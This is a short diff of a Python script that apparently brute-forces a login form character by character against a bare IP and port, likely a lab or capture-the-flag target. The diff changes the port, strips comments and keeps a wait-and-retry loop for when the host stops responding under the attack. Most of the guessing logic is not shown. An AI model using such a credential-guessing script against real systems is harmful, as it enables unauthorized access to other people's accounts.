@@ -1,15 +1,10 @@
 import requests
 import time
 
-url = "http://157.245.33.77:31629/login"
+url = "http://157.245.33.77:31968/login"
 
 user_name, passwd =  "", ""
 
-#data = {"username":user_name, "password":passwd} # For testing purpose
-
-#num_characters = (48 - 57)
-#alphabet_chr = (65-90)/(97-122)
-#special_characters = (32–47 / 58–64 / 91–96 / 123–126)
 
 char = ''
 
@@ -107,7 +102,7 @@ def cred_finder(cred_to_find):
 					track+=1
 
 			else:
-				#print(f"Invalid --> USERNAME : {user_name+usr_character} | PASSWORD : {passwd+pass_character}") # For testing purpose
+				
 				track+=1
 
 		except KeyboardInterrupt:
@@ -115,8 +110,7 @@ def cred_finder(cred_to_find):
 
 		except:
 			
-			# If the host is not available due to excessive brutefore attack
-			# then it will wait some time to send another request
+			
 			wait=5
 			time.sleep(wait)
 			print(f"\nCouldn\'t able to reach {url}   |  Waiting for {wait} seconds\n")
